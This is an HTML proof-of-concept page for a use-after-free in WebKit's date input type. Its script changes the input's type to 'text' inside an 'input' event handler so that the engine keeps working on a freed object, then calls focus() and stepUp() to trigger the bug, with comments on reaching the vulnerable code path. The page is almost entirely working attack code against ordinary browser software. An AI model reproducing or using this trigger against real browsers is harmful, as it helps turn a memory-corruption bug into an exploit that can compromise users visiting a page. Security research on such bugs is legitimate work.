<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>

<!-- This is our victim element -->
<input type="date" id="target">

<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== BASEDATEANDTIMEINPUTTYPE USE-AFTER-FREE ===", "info");
log("[*] Setting up the trap on the input event...", "info");

let input = document.getElementById("target");

// When the C++ code calls InputType::setValue, it dispatches the 'input' event.
// We catch it here.
input.addEventListener("input", () => {
    log("[!] INPUT EVENT FIRED! The C++ code is currently paused...", "warn");
    log("[!] Changing input type to 'text'. This destroys the Date input object in C++!", "hit");
    
    // Changing the type replaces the BaseDateAndTimeInputType instance 
    // with a TextFieldInputType instance. The old C++ object is DELETED.
    input.type = "text";
    
    log("[*] Returning to C++. The code will now execute on FREED memory!", "info");
});

setTimeout(() => {
    log("[*] Triggering the vulnerability...", "info");
    
    // We need to simulate user interaction to reach didChangeValueFromControl()
    // A simple value change or dispatching a synthetic event might be enough 
    // depending on the exact WebKit event routing, but focus + execCommand or 
    // stepUp/stepDown often hits the right internal paths.
    try {
        input.focus();
        // Force the value to change as if the user typed it
        input.stepUp(); 
    } catch(e) {
        log("[-] Error: " + e.message, "info");
    }
    
    log("[-] If you see this and the browser didn't crash, try clicking the date picker manually and changing a value.", "warn");
}, 1000);
</script>
</body>
</html>
